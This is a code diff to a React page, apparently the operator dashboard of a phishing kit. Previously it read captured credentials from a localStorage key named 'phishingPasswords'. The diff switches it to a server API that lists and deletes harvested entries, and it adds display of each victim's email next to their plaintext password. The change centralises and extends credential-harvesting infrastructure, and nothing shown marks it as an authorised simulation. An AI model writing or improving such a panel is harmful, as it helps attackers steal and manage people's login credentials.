@@ -7,7 +7,35 @@ interface PasswordEntry {
   id: string;
   password: string;
   site: string;
-  timestamp: Date;
+  timestamp: string;
+}
+
+// API functions
+async function fetchPasswords() {
+  try {
+    const response = await fetch('/api/passwords');
+    const data = await response.json();
+    if (data.success) {
+      return data.data;
+    }
+    return [];
+  } catch (error) {
+    console.error('Failed to fetch passwords:', error);
+    return [];
+  }
+}
+
+async function clearAllPasswords() {
+  try {
+    const response = await fetch('/api/passwords', {
+      method: 'DELETE'
+    });
+    const data = await response.json();
+    return data.success;
+  } catch (error) {
+    console.error('Failed to clear passwords:', error);
+    return false;
+  }
 }
 
 export default function PasswordsPage() {
@@ -15,24 +43,25 @@ export default function PasswordsPage() {
   const [isLoading, setIsLoading] = useState(true);
 
   useEffect(() => {
-    // Load passwords from localStorage
-    const savedPasswords = localStorage.getItem('phishingPasswords');
-    if (savedPasswords) {
-      const parsedPasswords = JSON.parse(savedPasswords).map((entry: any) => ({
-        ...entry,
-        timestamp: new Date(entry.timestamp)
-      }));
-      setPasswords(parsedPasswords);
-    }
-    setIsLoading(false);
+    // Load passwords from API
+    const loadPasswords = async () => {
+      const fetchedPasswords = await fetchPasswords();
+      setPasswords(fetchedPasswords);
+      setIsLoading(false);
+    };
+
+    loadPasswords();
   }, []);
 
-  const clearPasswords = () => {
-    localStorage.removeItem('phishingPasswords');
-    setPasswords([]);
+  const clearPasswords = async () => {
+    const success = await clearAllPasswords();
+    if (success) {
+      setPasswords([]);
+    }
   };
 
-  const formatDate = (date: Date) => {
+  const formatDate = (timestamp: string) => {
+    const date = new Date(timestamp);
     return date.toLocaleString('en-US', {
       year: 'numeric',
       month: 'short',
@@ -120,6 +149,15 @@ export default function PasswordsPage() {
                 </div>
 
                 <div className="space-y-3">
+                  <div>
+                    <label className="text-sm font-medium text-gray-500">Email</label>
+                    <div className="mt-1 p-3 bg-gray-50 rounded-md border">
+                      <span className="text-gray-900 text-sm break-all">
+                        {entry.email || 'Not provided'}
+                      </span>
+                    </div>
+                  </div>
+
                   <div>
                     <label className="text-sm font-medium text-gray-500">Password</label>
                     <div className="mt-1 p-3 bg-gray-50 rounded-md border">
